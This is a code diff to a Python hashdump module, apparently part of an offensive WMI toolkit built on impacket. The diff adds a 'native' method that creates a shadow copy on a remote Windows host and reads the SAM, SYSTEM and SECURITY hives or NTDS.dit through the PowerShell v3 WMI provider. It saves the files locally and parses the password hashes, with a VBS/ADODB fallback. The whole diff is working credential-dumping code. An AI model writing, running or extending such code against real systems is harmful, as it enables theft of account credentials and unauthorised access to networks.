@@ -10,6 +10,8 @@ from lib.methods.classMethodEx import class_MethodEx
 from lib.module_base import ModuleBase
 
 from binascii import hexlify
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets, NTDSHashes
 
 
@@ -22,14 +24,16 @@ class Hashdump(ModuleBase):
         p = subparsers.add_parser(Hashdump.name, help=Hashdump.description)
         p.add_argument("-dump", action="store", choices=["sss", "ntds"], default="sss",
                        help="Hash type to dump (sss for Security Account Manager, ntds for NTDS.dit)")
+        p.add_argument("-method", action="store", choices=["native", "legacy"], default="native",
+                       help="Extraction method: native (PS_ModuleFile, Win8+/2012+) or legacy (VBS+ADODB). Default: native with auto-fallback.")
         return p
 
     @staticmethod
     def run(iWbemLevel1Login, dcom, options, **kwargs):
-        executer = Hashdump(iWbemLevel1Login, dumpType=options.dump)
+        executer = Hashdump(iWbemLevel1Login, dumpType=options.dump, method=getattr(options, "method", "native"))
         executer.hashdump()
 
-    def __init__(self, iWbemLevel1Login, dumpType):
+    def __init__(self, iWbemLevel1Login, dumpType, method="native"):
         self.iWbemLevel1Login = iWbemLevel1Login
         self.executer = executeScript_Toolkit(self.iWbemLevel1Login)
         self.hostname = self.iWbemLevel1Login._INTERFACE__target
@@ -44,6 +48,7 @@ class Hashdump(ModuleBase):
         self.iWbemServices_cimv2 = None
         self.iWbemServices_subscription = None
         self.dumpType = dumpType
+        self.method = method
         self.creds_FilesInfo = {
             "sss": {
                 "filename": ["sam", "system", "security"],
@@ -61,28 +66,38 @@ class Hashdump(ModuleBase):
 
         self.logger.info("Starting hashdump...")
 
-        # Reuse cimv2/subscription namespace to avoid DCOM limitation
-        class_Method = class_MethodEx(self.iWbemLevel1Login)
-        self.iWbemServices_cimv2, self.iWbemServices_subscription = class_Method.check_ClassStatus(
-            ClassName=self.ClassName_StoreOutput, 
-            return_iWbemServices=True
-        )
+        # cimv2 is always needed for shadow copy create/cleanup
+        self.iWbemServices_cimv2 = self.iWbemLevel1Login.NTLMLogin("//./root/Cimv2", NULL, NULL)
+        self.iWbemLevel1Login.RemRelease()
 
         shadow_id, device_object = self._create_shadow_copy()
         if not shadow_id:
             return False
 
-        # I have been research this for a long time, "ADODB.Stream" can't read "\\?\"" directly
-        # But thankfully, after reading the post: https://medium.com/@WaterBucket/understanding-path-resolution-in-windows-70054c446b3b
-        # I have try "\??\", then boom!
-        kernel_object = device_object.replace("\\\\?\\", "\\??\\")
-        if not self._extract_file(kernel_object):
-            return False
+        download_ok = False
+        if self.method == "native":
+            download_ok = self._download_via_native(device_object)
+            if not download_ok:
+                self.logger.info("Native method failed, falling back to legacy.")
 
-        if not self._retrieve_file():
-            return False
+        if not download_ok:
+            # Legacy path needs the storage class + subscription namespace
+            class_Method = class_MethodEx(self.iWbemLevel1Login)
+            self.iWbemServices_cimv2, self.iWbemServices_subscription = class_Method.check_ClassStatus(
+                ClassName=self.ClassName_StoreOutput,
+                iWbemServices_Cimv2=self.iWbemServices_cimv2,
+                return_iWbemServices=True
+            )
+            # ADODB.Stream can't read "\\?\" directly, but kernel form "\??\" works.
+            # I have been research this for a long time, "ADODB.Stream" can't read "\\?\"" directly
+            # But thankfully, after reading the post: https://medium.com/@WaterBucket/understanding-path-resolution-in-windows-70054c446b3b
+            # I have try "\??\", then boom!
+            kernel_object = device_object.replace("\\\\?\\", "\\??\\")
+            if self._extract_file(kernel_object) and self._retrieve_file():
+                download_ok = True
 
-        self._parse_hashes()
+        if download_ok:
+            self._parse_hashes()
 
         self._cleanup_shadow_copy(shadow_id)
 
@@ -108,6 +123,56 @@ class Hashdump(ModuleBase):
                 self.logger.error(f"Failed to create shadow copy, error code: {resp.ReturnValue}")
                 return None, None
     
+    # From https://github.com/0xthirteen/WMI_Proc_Dump :)
+    def _download_via_native(self, device_object):
+        """Read SAM/SYSTEM/SECURITY (or NTDS files) directly from shadow copy via PS_ModuleFile.FileData.
+        No VBS, no temp class — provider passes InstanceID to CreateFileW which natively
+        accepts \\\\?\\GLOBALROOT\\Device\\... shadow copy paths."""
+        PSV3_NAMESPACE = "//./root/Microsoft/Windows/Powershellv3"
+
+        try:
+            iWbemServices = self.iWbemLevel1Login.NTLMLogin(PSV3_NAMESPACE, NULL, NULL)
+            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+            self.iWbemLevel1Login.RemRelease()
+        except Exception as e:
+            if "WBEM_E_INVALID_NAMESPACE" in str(e):
+                self.logger.error("PSv3 namespace not available (requires Win8+/Server2012+).")
+                return False
+            self.logger.error(f"Failed to bind PSv3 namespace: {e}")
+            return False
+
+        for filename in self.creds_FilesInfo["filename"]:
+            # NTDS mode: SYSTEM hive lives in config\, not NTDS\
+            if self.dumpType == "ntds" and filename.lower() == "system":
+                rel_path = f"\\Windows\\System32\\config\\{filename}"
+            else:
+                rel_path = f"{self.creds_FilesInfo['directory']}{filename}"
+            target_path = f"{device_object}{rel_path}"
+            escaped = target_path.replace("\\", "\\\\")
+            saved = os.path.join(self.save_Path, filename)
+            try:
+                self.logger.info(f"Downloading {filename} via PS_ModuleFile from shadow copy...")
+                file_instance, _ = iWbemServices.GetObject(f'PS_ModuleFile.InstanceID="{escaped}"')
+                props = file_instance.getProperties()
+                file_data = props["FileData"]["value"]
+            except Exception as e:
+                self.logger.error(f"Failed to read {filename} via PS_ModuleFile: {e}")
+                return False
+
+            if not file_data:
+                self.logger.error(f"FileData empty for {filename}")
+                return False
+
+            # First 4 bytes (BE) = file length, then content
+            file_length = int.from_bytes(bytes(file_data[0:4])[::-1], byteorder='little', signed=False)
+            file_bytes = bytes(file_data[4:file_length + 4])
+
+            with open(saved, "wb") as f:
+                f.write(file_bytes)
+            self.logger.log(100, f"Save {filename} to {saved.upper()}, size: {file_length} bytes")
+
+        return True
+
     def _extract_file(self, kernel_object):
         self.logger.info("Dumping secrets from from shadow copy...")
 
